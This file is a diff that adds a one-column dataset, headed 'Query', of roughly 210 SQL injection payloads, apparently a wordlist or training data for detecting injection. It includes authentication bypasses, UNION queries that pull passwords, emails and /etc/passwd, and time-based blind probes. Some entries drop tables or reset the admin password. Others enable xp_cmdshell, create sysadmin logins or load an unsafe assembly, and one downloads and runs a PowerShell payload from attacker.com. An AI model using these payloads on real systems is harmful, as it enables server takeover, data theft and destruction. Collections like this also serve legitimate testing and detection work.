@@ -1,0 +1,211 @@
+Query
+' OR '1'='1
+1'; DELETE FROM users;
+'; SELECT * FROM users WHERE username LIKE '%admin%'--
+' UNION SELECT password FROM users WHERE username='john--
+' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+'; UPDATE users SET password='hacked' WHERE username='admin--
+"' AND LENGTH(database())>10 AND SUBSTRING(database(),1,1)='m'--"
+1; DROP TABLE users;
+'; SELECT * FROM information_schema.tables WHERE table_name LIKE 'users%'
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name LIKE 'password%')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+' OR 1=(SELECT COUNT(*) FROM (SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema=database()) AS foo)--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
+"' UNION SELECT NULL, table_name, column_name FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%password%'--"
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name REGEXP '^[a-z]+$')=0--
+"'; EXEC master.dbo.xp_cmdshell 'powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(""http://attacker.com/malicious-payload\"")""'--"
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name REGEXP '^p[a-z]+s')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+' OR SLEEP(10)--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%a%')=2 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+"'; CREATE TEMPORARY TABLE temp_users AS SELECT * FROM users; DROP TABLE users; CREATE TABLE users AS SELECT * FROM temp_users WHERE 1=0; INSERT INTO users VALUES ('hacker', 'hacked');--"
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%a%')>1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+' OR (SELECT COUNT(*) FROM (SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema=database()) AS foo) > 5--
+"' UNION SELECT NULL, table_name, column_name, NULL FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%password%' AND table_name NOT IN ('users', 'admin')--"
+'; CREATE FUNCTION test_func() RETURNS INT DETERMINISTIC BEGIN DECLARE var INT; SET var = (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE 'users%'); RETURN var; END; SELECT test_func() FROM DUAL;--
+"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name LIKE 'users%' AND column_name REGEXP '^(p|e)[a-z]{3,6}$')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--"
+"'; EXEC sp_addlogin 'hacker', 'password'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin';--"
+' OR (SELECT COUNT() FROM information_schema.tables WHERE table_name LIKE '%backup%')=1 AND (SELECT COUNT() FROM information_schema.tables WHERE table_name LIKE '%users%')>0--
+"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name NOT IN ('users', 'admin'))>0 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--"
+'; SELECT * FROM users WHERE username LIKE 'a%' UNION SELECT * FROM users WHERE username LIKE 'b%'--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name REGEXP '^p[a-z]+s')>1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%a%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'))>20--
+' AND (SELECT COUNT(*) FROM (SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema=database()) AS foo) > 10 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+'; SELECT * FROM users WHERE username='admin' AND password='123456' OR 1=1;--
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE' AND table_name!='users' AND table_name!='admin')>0 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+'; EXEC xp_cmdshell 'dir C:';--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name REGEXP '^p[a-z]+s')>0 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%')--
+'; SELECT * FROM users WHERE username='admin' UNION SELECT * FROM users WHERE username!='admin';--
+' AND (SELECT COUNT() FROM information_schema.tables WHERE table_name LIKE '%users%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND (SELECT COUNT() FROM information_schema.tables WHERE table_name LIKE '%backup%')=0--
+'; CREATE PROCEDURE test_proc() AS BEGIN SELECT * FROM users; END; EXEC test_proc();--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%password%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM users WHERE username='guest' AND password IS NULL)--
+'; DROP TABLE users;--
+' AND (SELECT COUNT() FROM (SELECT DISTINCT(table_name) FROM information_schema.columns WHERE table_schema=database()) AS foo) > 10 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND (SELECT COUNT() FROM information_schema.tables WHERE table_name='secrets')=1--
+'; DECLARE @pass VARCHAR(20); SET @pass = 'password'; SELECT * FROM users WHERE username='admin' AND password=@pass;--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%pass%')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM users WHERE username='guest' AND password IS NULL)--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'dir C:';--"
+' AND (SELECT COUNT() FROM information_schema.tables WHERE table_name LIKE '%users%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND NOT EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%backup%') AND (SELECT COUNT() FROM information_schema.columns WHERE table_schema=database() AND table_name='secrets' AND column_name LIKE '%password%')>=1--
+'; UPDATE users SET password='new_password' WHERE username='admin';--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%password%')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND NOT EXISTS(SELECT * FROM users WHERE username='guest' AND password IS NULL)--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; EXEC sp_OACreate 'WScript.Shell', @objShell OUT; EXEC sp_OAMethod @objShell, 'Run', NULL, 'cmd /c dir c:'; EXEC sp_OADestroy @objShell;--"
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%pass%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM users WHERE username='guest' AND password IS NULL) AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='secrets' AND table_type='BASE TABLE')--
+'; DROP PROCEDURE IF EXISTS test_proc; CREATE PROCEDURE test_proc() AS BEGIN SELECT * FROM users; END; EXEC test_proc();--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%password%')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') UNION SELECT * FROM secrets WHERE secret LIKE '%password%';--
+'; CREATE TEMPORARY TABLE temp_table AS SELECT * FROM users WHERE username='admin'; SELECT * FROM temp_table WHERE password='password'; DROP TABLE temp_table;--
+' AND (SELECT COUNT() FROM information_schema.columns WHERE table_schema=database() AND table_name='users' AND column_name LIKE '%password%')=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND NOT EXISTS(SELECT * FROM users WHERE username='guest' AND password IS NULL) HAVING COUNT()>0;--
+"'; EXEC master.dbo.sp_addlogin 'hacker', 'password'; EXEC master.dbo.sp_addsrvrolemember 'hacker', 'sysadmin';--"
+' AND (SELECT COUNT() FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%users%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM secrets WHERE secret LIKE '%password%') AND (SELECT COUNT() FROM information_schema.tables WHERE table_schema=database() AND table_name='secrets')=1--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; EXEC sp_OACreate 'ADODB.Stream', @objStream OUT; EXEC sp_OAMethod @objStream, 'Open'; EXEC sp_OAMethod @objStream, 'WriteText', NULL, 'Hacked!'; EXEC sp_OAMethod @objStream, 'SaveToFile', NULL, 'C:\hacked.txt', 2; EXEC sp_OAMethod @objStream, 'Close'; EXEC sp_OADestroy @objStream;--"
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%users%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='secrets' AND table_type='BASE TABLE') UNION SELECT * FROM secrets WHERE secret LIKE '%password%';--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; CREATE ASSEMBLY hack_dll FROM 'C:\hack.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE hack_proc AS EXTERNAL NAME hack_dll.[HackClass].[HackMethod]; EXEC hack_proc;--"
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%users%')>=1 AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='secrets' AND table_type='BASE TABLE') UNION ALL SELECT secret FROM secrets WHERE secret LIKE '%password%';--
+"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; CREATE TRIGGER hack_trigger ON users FOR INSERT AS EXEC xp_cmdshell 'echo Hacked! >> C:\hacked.txt';--"
+1' AND SLEEP(10) --
+1' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0 AND SLEEP(5) --
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'test' AND table_name LIKE '%a%')>0 THEN 1 ELSE 0 END)>0 AND SLEEP(5) --
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%a%')>0 THEN 1 ELSE 0 END)>0 AND SLEEP(5) --
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 2,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 3,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 4,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 5,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 6,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 7,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 8,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,1,1) FROM users LIMIT 9,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,2,1) FROM users LIMIT 0,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"1' AND (SELECT CASE WHEN (SELECT SUBSTRING(username,2,1) FROM users LIMIT 1,1) = 'a' THEN 1 ELSE 0 END)>0 AND SLEEP(5) --"
+"' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -'"
+"' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)-- -'"
+' AND (SELECT SLEEP(5) FROM users WHERE username = 'admin')='
+"' AND IF((SELECT LENGTH(username) FROM users WHERE username = 'admin')=6, SLEEP(5), 0)-- -'"
+"' OR IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)-- -'"
+"' UNION SELECT SLEEP(5),column_name FROM information_schema.columns WHERE table_name='users'-- -'"
+"' UNION SELECT SLEEP(5),CONCAT(username,':',password) FROM users WHERE username='admin'-- -'"
+"' UNION SELECT SLEEP(5),LOAD_FILE('/etc/passwd')-- -'"
+"' AND IF((SELECT password FROM users WHERE username='admin')='password',SLEEP(5),0)-- -'"
+"' OR IF((SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0, SLEEP(5), 0)-- -'"
+"' AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)-- -'"
+"' UNION SELECT SLEEP(5),TABLE_NAME FROM information_schema.tables WHERE table_schema=database()-- -'"
+"' OR IF(SUBSTR(DATABASE(),1,1)='a', SLEEP(5), 0)-- -'"
+"' AND IF((SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') > 0, SLEEP(5), 0)-- -'"
+"' AND IF((SELECT COUNT(*) FROM users WHERE username LIKE 'a%' AND password LIKE 'b%') > 0, SLEEP(5), 0)-- -'"
+' AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_name='users')='
+"' OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE 'u%') > 0, SLEEP(5), 0)-- -'"
+"' UNION SELECT SLEEP(5),SUBSTRING(password,1,1) FROM users WHERE username='admin'-- -'"
+"' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='a', SLEEP(5), 0)-- -'"
+"1' UNION SELECT null, load_file('/etc/passwd')--"
+"1' UNION SELECT null, CONCAT(first_name, ' ', last_name, ':', email) FROM users--"
+"1' UNION SELECT null, CONCAT(column_name, ':', table_name) FROM information_schema.columns WHERE table_schema = 'public'--"
+"1' UNION SELECT null, schema_name FROM information_schema.schemata--"
+"1' UNION SELECT null, concat(table_name, ':', column_name) FROM information_schema.columns WHERE table_schema=database()--"
+"1' UNION SELECT null, CONCAT(first_name, ' ', last_name, ':', email) FROM users WHERE email LIKE '%gmail%'--"
+"1' UNION SELECT null, CONCAT(name, ' (', email, ')') FROM users WHERE email REGEXP '^[^@]+@gmail\\.com$'--"
+"1' UNION SELECT null, CONCAT(username, ':', password) FROM admin--"
+"1' UNION SELECT null, CONCAT(name, ':', salary) FROM employees ORDER BY salary DESC--"
+"1' UNION SELECT null, CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE column_name LIKE '%password%'--"
+"1' UNION SELECT null, CONCAT(first_name, ' ', last_name, ':', email) FROM users WHERE created_at BETWEEN '2022-01-01' AND '2022-12-31'--"
+"1' UNION SELECT null, CONCAT(username, ':', password) FROM users WHERE username LIKE '%admin%'--"
+"1' UNION SELECT null, CONCAT(column_name, ':', table_name) FROM information_schema.columns WHERE column_name LIKE '%credit%'--"
+"1' UNION SELECT null, CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE data_type LIKE '%text%'--"
+"1' UNION SELECT null, CONCAT(first_name, ' ', last_name, ':', email) FROM users WHERE last_login < DATE_SUB(NOW(), INTERVAL 30 DAY)--"
+"1' UNION SELECT null, CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE table_name NOT IN ('users', 'products', 'orders')--"
+"1' UNION SELECT null, CONCAT(first_name, ' ', last_name, ':', email) FROM users WHERE username = 'admin' AND password = md5('admin')--"
+"1' UNION SELECT null, CONCAT(name, ':', price) FROM products WHERE category_id = 1 ORDER BY price DESC--"
+"1' UNION SELECT null, CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE table_name RLIKE '^user'--"
+"1; SELECT username, password FROM users UNION SELECT username, password FROM admin;--"
+"1; SELECT username, password FROM users UNION SELECT NULL, schema_name FROM information_schema.schemata;--"
+"1; SELECT username, password FROM users UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name';--"
+"' UNION SELECT username, password FROM users UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name';--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' LIMIT 10,1;--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' LIMIT 20,1;--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' LIMIT 30,1;--"
+"1; SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table1';--"
+"' UNION SELECT username, password FROM users UNION SELECT NULL, COUNT(*) FROM information_schema.tables WHERE table_schema='database_name';--"
+"1; SELECT username, password FROM users UNION SELECT NULL, GROUP_CONCAT(schema_name) FROM information_schema.schemata;--"
+"1; SELECT username, password FROM users UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='database_name';--"
+"' UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table1';--"
+"1; SELECT username, password FROM users UNION SELECT NULL, COUNT(*) FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table1';--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name LIKE '%table1%';--"
+"1; SELECT username, password FROM users UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name LIKE '%table1%' LIMIT 1,1;--"
+"1; SELECT username, password FROM users UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' AND table_name REGEXP '^(table1|table2|table3)$';--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='database_name' AND column_name REGEXP '^id|^name';--"
+"1; SELECT username, password FROM users UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 1;--"
+"' UNION SELECT NULL, CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database() AND column_name REGEXP '^password';--"
+"1 or benchmark(10000000,MD5(1))#"
+%20or%20''='
+||UTL_HTTP.REQUEST
+ or pg_sleep(__TIME__)--
+hi' or 'x'='x';
+""") or sleep(__TIME__)="""
+ or 'whatever' in ('whatever')
+; begin declare @var varchar(8000) set @var=' ...
+" union select 1,load_file('/etc/passwd'),1,1,1;"
+0x77616974666F722064656C61792027303A303A313027 ...
+exec(@s)
+) or pg_sleep(__TIME__)--
+ union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(__TIME__)='
+ or 1 --'
+"or 0=0 #"""
+having
+a'
+""" or isNULL(1/0) /*"
+declare @s varchar (8000) select @s = 0x73656c ...
+Ã¢ or 1=1 --
+x' OR full_name LIKE '%Bob%
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'%20or%20''='
+'%20or%20'x'='x
+')%20or%20('x'='x
+' or 0=0 --
+' or 0=0 #
+" or 0=0 #"""
+' or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+' or 1=1 or ''='
+" or 1=1 or """"="
+' or a=a--
+ or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+or
+procedure
+handler
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+"<>""'%;)(&+"
+'%20or%201=1
+'sqlattempt1
+%28
+%29
+%26
+%21
+' or ''='
+' or 3=3
+ or 3=3 --
+'-'
